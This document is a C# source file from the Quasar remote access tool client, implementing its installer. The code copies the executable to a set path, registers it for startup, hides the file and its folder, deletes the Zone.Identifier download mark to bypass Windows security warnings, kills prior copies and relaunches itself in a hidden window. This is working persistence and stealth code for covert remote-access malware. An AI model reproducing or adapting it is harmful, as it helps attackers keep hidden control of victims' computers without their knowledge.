using Quasar.Client.Config;
using Quasar.Client.Extensions;
using Quasar.Common.Helpers;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Setup
{
    public class ClientInstaller : ClientSetupBase
    {
        public void ApplySettings()
        {
            if (Settings.STARTUP)
            {
                var clientStartup = new ClientStartup();
                clientStartup.AddToStartup(Settings.INSTALLPATH, Settings.STARTUPKEY);
            }

            if (Settings.INSTALL && Settings.HIDEFILE)
            {
                try
                {
                    File.SetAttributes(Settings.INSTALLPATH, FileAttributes.Hidden);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex);
                }
            }

            if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
            {
                try
                {
                    DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLPATH));
                    di.Attributes |= FileAttributes.Hidden;
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex);
                }
            }
        }

        public void Install()
        {
            // create target dir
            if (!Directory.Exists(Path.GetDirectoryName(Settings.INSTALLPATH)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(Settings.INSTALLPATH));
            }

            // delete existing file
            if (File.Exists(Settings.INSTALLPATH))
            {
                try
                {
                    File.Delete(Settings.INSTALLPATH);
                }
                catch (Exception ex)
                {
                    if (ex is IOException || ex is UnauthorizedAccessException)
                    {
                        // kill old process running at destination path
                        Process[] foundProcesses =
                            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Settings.INSTALLPATH));
                        int myPid = Process.GetCurrentProcess().Id;
                        foreach (var prc in foundProcesses)
                        {
                            // dont kill own process
                            if (prc.Id == myPid) continue;
                            // only kill the process at the destination path
                            if (prc.GetMainModuleFileName() != Settings.INSTALLPATH) continue;
                            prc.Kill();
                            Thread.Sleep(2000);
                            break;
                        }
                    }
                }
            }

            File.Copy(Application.ExecutablePath, Settings.INSTALLPATH, true);

            ApplySettings();

            FileHelper.DeleteZoneIdentifier(Settings.INSTALLPATH);

            //start file
            var startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                FileName = Settings.INSTALLPATH
            };
            Process.Start(startInfo);
        }
    }
}
